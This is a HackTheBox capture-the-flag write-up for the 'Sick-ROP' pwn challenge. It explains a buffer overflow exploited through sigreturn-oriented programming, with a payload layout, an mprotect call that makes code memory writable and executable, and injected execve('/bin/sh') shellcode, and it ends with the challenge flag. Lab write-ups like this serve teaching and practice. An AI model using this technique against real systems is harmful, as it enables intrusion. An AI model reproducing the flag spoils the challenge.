---
title: "Sick-ROP"
ctf: "HackTheBox"
date: 2026-06-13
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Sick-ROP

## Summary

Minimal static binary (read/write/vuln/_start, ~86 bytes code, no data section). BOF reads 0x300 bytes into 32B stack buffer. Three-phase SROP: mprotect the code page RWX, then inject shellcode.

## Solution

### Binary analysis

- `vuln()`: `sub rsp, 0x20; mov r10, rsp; read(0, r10, 0x300); write(1, r10, n); leave; ret`
- read/write functions take args from stack (`[rsp+8]=rsi, [rsp+0x10]=rdx`)
- No `pop rax`/`pop rdi` — raw syscall wrappers only
- Only writable memory is the (ASLR'd) stack

### Phase 1: Overflow + SROP frame

```
payload1 = b'A' * 0x28           # buffer(32) + saved_rbp(8)
         + p64(vuln)             # return to vuln for 2nd read
         + p64(syscall_ret)      # chain target after 2nd vnln's leave;ret
         + SigreturnFrame(
             rax=10, rdi=0x400000, rsi=0x4000, rdx=7,
             rsp=vuln_ptr,       # 0x4010d8 contains qword 0x40102e (vuln)
             rip=syscall_ret)    # 0x401014
```

### Phase 2: Trigger sigreturn

Second vuln call reads 15 bytes → `read()` returns 15 in rax → chains to `syscall; ret` → sigreturn restores registers → `mprotect(0x400000, 0x4000, 7)` → pages 0x400000-0x404000 RWX. The `ret` pops `[rsp=0x4010d8]` = `vuln` → third vuln call.

### Phase 3: Shellcode injection

Third vuln overflow → ROP chain calls `read(0, 0x400100, 0x200)` → send execve("/bin/sh") shellcode → `ret` jumps to `0x400100` → shell.

### Key trick: vuln_ptr = 0x4010d8

File offset `0x10d8` in this binary happens to contain the little-endian qword `0x40102e` (the Vuln function address), placed there by string/symbol table alignment. Using it as `rsp` in the sigframe lets the `ret` after mprotect restart vuln cleanly.

## Flag

```
HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
```
